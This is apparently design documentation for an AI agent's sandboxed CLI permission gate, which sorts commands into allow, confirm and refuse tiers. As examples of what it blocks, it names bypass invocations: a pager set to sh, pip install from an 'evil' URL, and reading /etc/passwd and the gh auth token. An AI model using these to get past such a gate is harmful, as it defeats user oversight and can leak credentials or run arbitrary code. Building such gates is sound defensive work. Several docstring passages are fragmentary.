The ``shell:execute:<binary>`` bridge — a skill brings its own CLI.

A skill that needs GitHub does not need a bespoke connector; it needs ``gh``.
Declaring ``shell:execute:gh`` in ``SKILL.md`` grants **that one binary**, to
**that one skill's session**, on **that one agent instance**, restricted to the
subcommands named in :data:`BINARY_POLICIES` below.

Every invocation lands in exactly one of **three** tiers
(:func:`classify_invocation`):

* ``ALLOW`` — a read. Runs with no prompt: loading the skill is the consent, and
  a triage is five to ten reads.
* ``CONFIRM`` — a bounded write (``gh issue comment``). The user is shown the
  **exact command** and answers yes / no / always-for-this-command-class. It
  never runs on its own.
* ``REFUSE`` — never runs, and never raises a prompt. Reserved for the
  escalation classes a single yes/no cannot honestly describe: printing a
  credential (``gh auth token``), defining or installing code that then runs
  (``gh alias``, ``gh extension``, ``gh config``), and the unbounded generic
  surfaces (any ``gh api`` write, which is "do anything to any resource" behind
  one flag).

Keeping CONFIRM and REFUSE apart is the point. Collapsing them into one prompt
turns the gate into a habit — click yes, and yes covers ``gh auth token`` too.

Four properties make this safe enough to bridge while the general shell sandbox
is still deferred:

1. **Deny by default at two levels.** A binary with no entry here cannot be
   declared at all, and a subcommand absent from its entry is refused. Nothing is
   permitted by omission — and nothing is *confirmable* by omission either: a
   write reaches the CONFIRM tier only by being listed in ``confirm_actions``.
2. **No global state.** The grant lives on the agent instance
   (:class:`BinaryGrants`), never in a module-level allowlist. One agent's skill
   can never widen another agent's shell.
3. **A write executes only behind the agent's confirmation gate.** This module
   classifies; it does not enforce consent. ``Agent._execute_tool`` is what
   actually stops a CONFIRM call — the same single funnel that has always gated
   ``write_file`` — and ``ShellToolsMixin.skill_grant_covers_call`` exempts only
   the ALLOW tier from it. A caller wanting "may this run with nobody asked?"
   uses :func:`validate_invocation`, which answers no for CONFIRM and REFUSE
   alike, so an un-updated caller fails closed.
4. **Read-only by construction — for CLIs that talk to something *external*.**
   ``pytest`` is a different class of grant and says so in its own summary: it
   EXECUTES the project's own test code using consent from the loaded skill.
   The separate ``execute_python_file`` tool still prompts. This table restricts
   invocation shape
   (no plugin injection, no interactive hang, no writes/paths outside the
   checkout) — never what the tests themselves do. It has no CONFIRM tier.

Adding a CLI is a data entry here plus a ``SKILL.md`` — never a new branch in the
shell tool. That is the acceptance test for this module: supporting GitLab must
be ``"glab": BinaryPolicy(...)`` and nothing else.

**The bypass class this table is really about.** Almost every CLI worth granting
can be talked into running a *different* program: ``git -c core.pager=sh``,
``python -c``, ``npm run``, ``go test -exec``, ``pip install <url>``,
``find -exec``. An entry that lists subcommands and stops has granted the shell
under a narrower name (CWE-184). Four mechanisms answer it, in rough order of
how much they carry:

* the **action-first rule** — nothing may sit between a subcommand and its
  action, so GAIA's verdict and the CLI's dispatch are the same token;
* **leading flags are refused** unless listed in ``bare_flags``, which is what
  puts ``git -c``, ``git --git-dir``, ``go -C`` and ``pip -i`` out of reach
  before a subcommand is even read;
* :attr:`Subcommand.denied_operand_prefixes` — a *name* is a write a prompt can
  describe (``pip install requests``); a *URL* is fetch-and-run and is not;
* :attr:`Subcommand.delegate_flag` — ``python -m pytest`` is re-classified
  against pytest's own rule, so ``-m`` cannot be the way around it.

Where none of those can hold the line, the CLI does not get an entry at all.
``make`` is the standing example: its argument is a target in a file the agent
can write, so ``make test`` means "run whatever the Makefile says" and no
prompt text can honestly describe the call. There is no safe subset to list.

@dataclass(frozen=True)
class Subcommand:
    """The rule for one ``<binary> <subcommand>`` pair — or, when set as
    :attr:`BinaryPolicy.positional`, for a binary with no subcommand at all.

    Attributes:
        actions: Allowed third tokens (``gh issue **list**``), each running with
            no prompt. Empty plus ``free_form=False`` means the subcommand takes
            no action and any action token is refused.
        confirm_actions: Action tokens that WRITE and are offered to the user as
            a confirmable action rather than refused (``gh issue **create**``).
            Disjoint from *actions* by construction — an action in both would be
            silently read-only, which is the one mistake this table must not
            make quietly, so :meth:`__post_init__` refuses it.
        free_form: The subcommand's first positional is data, not an action
            (``gh api **repos/amd/gaia**``), so it is not matched against
            *actions*. ``denied_actions`` still applies.
        denied_actions: Action tokens refused even under ``free_form``.
        denied_flags: Flags refused outright, checked BEFORE the action is
            classified — so a denied flag refuses a confirmable write too, and
            no prompt is raised for it.
        flag_values: ``{flag: allowed lowercase values}``. A listed flag must
            carry one of those values (``--method GET``).
        value_flags: Flags that consume the following token. Needed so a flag's
            value is never mistaken for the action positional.
        path_operands: For :attr:`BinaryPolicy.positional` rules only — every
            non-flag token is a path operand (pytest's test paths), not a
            single subcommand action, and each is checked for a shape that
            could escape the project (absolute, drive-letter, or ``..``).
        allowed_flags: The valueless flags this grant accepts. Setting it turns
            flag checking into an ALLOWLIST — a flag absent from it, from
            ``value_flags``, from ``flag_values`` and from the policy's
            ``bare_flags`` is refused. Always the rule for a
            :attr:`BinaryPolicy.positional` binary, and for a subcommand rule
            that sets ``strict_flags``.
        strict_flags: Make subcommand-mode flag checking an ALLOWLIST even when
            the rule lists no ``allowed_flags`` of its own —
            anything not in ``allowed_flags`` / ``value_flags`` / ``flag_values``
            / ``bare_flags`` is refused. Set for every CLI whose flags can name
            a PROGRAM (``go``, ``npm``, ``pip``, ``uv``). A denylist there is
            unclosable: ``go vet -vettool=./x`` runs ``./x``, npm accepts any
            config key as a flag, and the next release of either adds one this
            table has never seen. Fail closed instead — a missed flag is then a
            refusal someone reports, not a silent execution.
        inline_value_flags: Value-taking flags accepted ONLY in the attached
            ``--flag=value`` form. For a rule that refuses every operand
            (``npm ci``), the spaced form is indistinguishable from the operand
            it refuses — ``--omit dev`` and ``--omit left-pad`` parse the same
            here. Attached, the value is unambiguous, so ``npm ci --omit=dev``
            works without the value-flag that would swallow a package name.
        path_value_flags: Value-taking flags whose value is a FILE this
            command reads or writes (``go test -coverprofile=cover.out``). The
            value must stay inside the checkout, by the same lexical test that
            guards a path operand. Without it the only options are to deny the
            flag — losing an ordinary CI line — or to accept a caller-chosen
            destination anywhere on disk.
        no_operands: The subcommand takes flags and nothing else, so a bare
            call is the read and ANY positional token is refused. ``git branch``
            lists branches; ``git branch <name>`` creates one, and free-form
            would have called that a read.
        flag_value_prefixes: For positional rules — ``{flag: allowed lowercase
            value prefixes}``. Like ``flag_values`` but for a flag whose safe
            values share a prefix rather than an exact set (``-p no:...``).
        denied_flag_reasons: ``{flag: one-line reason}`` shown in the refusal.
            Falls back to a generic message when absent. Used by both rule
            shapes — a denied flag has to say *why* it is denied or the model
            retries it verbatim.
        confirm: The SUBCOMMAND is the write, so reaching it at all is CONFIRM
            (``git commit``, ``npm ci``). ``gh``'s writes sit one token deeper
            and use ``confirm_actions`` instead; a rule may not use both, since
            two write tiers on one subcommand cannot both be true.
        confirm_reason: The clause the prompt uses in place of the policy-wide
            :attr:`BinaryPolicy.confirm_summary` — what *this* subcommand does,
            in the one line a user is asked to approve. ``git checkout`` and
            ``git add`` are both writes and are not the same risk.
        denied_operand_prefixes: ``{lowercase prefix: reason}`` refused in any
            non-flag token AND in any resolved flag value. This is what keeps a
            confirmable install from becoming a fetch-and-run: ``pip install``
            of a NAME is a write a prompt can describe, ``pip install
            https://…`` (or ``-r`` pointing at a URL) is not. A ``"-"`` key
            catches the bare stdin operand — in operand position that is the
            only token that can start with a dash.

            A prefix carrying a scheme marker (``:`` or ``+``) matches ANYWHERE
            in the token, not just at the front: PEP 508 lets the name come
            first, so ``pip install pkg @ https://evil/x.whl`` is the same
            fetch-and-run as ``pip install https://evil/x.whl``.
        delegate_flag: For :attr:`BinaryPolicy.positional` rules only — the
            flag whose value names ANOTHER policed binary, so the rest of the
            invocation is re-classified against that binary's policy
            (``python -m pytest`` is checked as ``pytest``). Without it, every
            ``-m``-capable binary is a hole straight through the table.
        script_args: For positional rules only — the first path operand names a
            PROGRAM, so every token after it is that program's arguments, not
            this binary's (``python util/lint.py --all --fix``). Flag
            validation stops there; what still holds is containment — no
            argument, nor a path attached to one, may leave the checkout.

            terminal, so a login that insists on one cannot be driven and is
            not supported here.
        auth_login_timeout_s: How long to wait for the user to finish in the
            browser before giving up and saying so. Bounded on purpose: a
            device code expires, so waiting forever only hides that it did.
        required_scopes: The permissions the skills using this CLI actually
            need. Requested at login and verified after — never widened

        install_hint: How to get it — named in the load-time failure when the
            binary is not on ``PATH``.
        subcommands: The allowlist, keyed by subcommand. Absent == refused.
            Ignored when ``positional`` is set.
        bare_flags: Flags accepted with no subcommand at all (``gh --version``).
            Also folded into the allowlist for a ``positional`` binary, where
            *every* invocation is "no subcommand".

            ``<binary> [operands] [flags]`` with no subcommand step at all

            is refused. Set means the skill loads without the grant and the
            model is told this instead.
        single_dash_long: This CLI spells long options with ONE dash
            (Go's standard ``flag`` package: ``-exec``, ``-ldflags``), so a
            flag token must not be read as a short flag carrying an attached
            value. Getting this wrong is a bypass, not a cosmetic difference —
            see :func:`_split_flag`.
        confirm_summary: The clause a CONFIRM prompt uses when the rule does
            not override it — "writes to GitHub", "changes this repository".
            One line, and it must be true of every write the policy offers.
        refuse_note: The closing sentence of an unknown-subcommand refusal,
            naming the classes this CLI never runs. Says what is out of reach
            so the model stops hunting for a spelling that works.
        remote_operands: This CLI's operands name things on a REMOTE service
            (``gh issue view 42``), not files on this machine, so the shell
            tool's path-traversal scan has nothing to check and skips the
            segment. False for every local CLI — ``git diff --no-index
            /etc/passwd`` and ``python ../x.py`` are exactly the reads that
            scan exists for, and a grant must not turn it off.
        ungranted: Subcommands this binary may run with **no skill grant at
            all**, and then only at the ALLOW tier. Empty for every CLI whose
            whole point is the grant (``gh``, ``pytest``). Non-empty only where
            a read-only floor predates the policy — ``git status`` has always
            been in the shell tool's whitelist, and this is where that floor
            now lives, so one table describes the binary instead of two.
        setup: How GAIA can install and authenticate this CLI for the user.
            ``None`` means it cannot, and the user is told to do it by hand
            rather than offered something that will not work.
        python_module: The module that runs this CLI as ``python -m <module>``.
            That spelling is then judged as the binary itself — same grant,
            same policy — instead of as an ungranted ``python``.

#
# HARD-REFUSED for `gh` — never confirmable, so no prompt is ever raised for
# them. Each is an escalation of a DIFFERENT kind than "this writes to a repo",
# which is why they are not merely writes the user could approve:
#   auth token prints the credential itself (hence auth allows `status` only)
#   alias      defines an arbitrary shell command under a gh name
#   extension  installs and runs third-party code
#   config     sets the editor/pager, i.e. command execution
#   codespace  opens a remote shell
#   secret / variable / ssh-key / gpg-key   credential surfaces
#   api -X POST|PATCH|DELETE, -f/--field, --input, graphql
#              the generic surface: one prompt cannot describe "any resource,
#              any method". The named write subcommands below can.
#   pr merge / repo delete / release delete / label delete
#              irreversible on someone else's work; land or destroy, not triage
#
# ALLOWED but worth knowing: `gh issue create -T/--template` seeds the body from
# the repo's own .github/ISSUE_TEMPLATE. It reads a local file, so it is the
# same shape as --body-file — but only ever a file already published in the
# repo it posts to, so it discloses nothing new. Revisit if gh ever lets
# --template name an arbitrary path.
#
# They need no explicit block: anything not listed below is refused.
#
# CONFIRMABLE writes (`confirm_actions`) are the triage last mile — post the
# comment, file the issue, apply the label. Each shows the user the exact
# command and runs only on approval. Scope creep here is the risk the table
# guards: a write earns a place only if a single line of prompt text can
# honestly describe what it does.
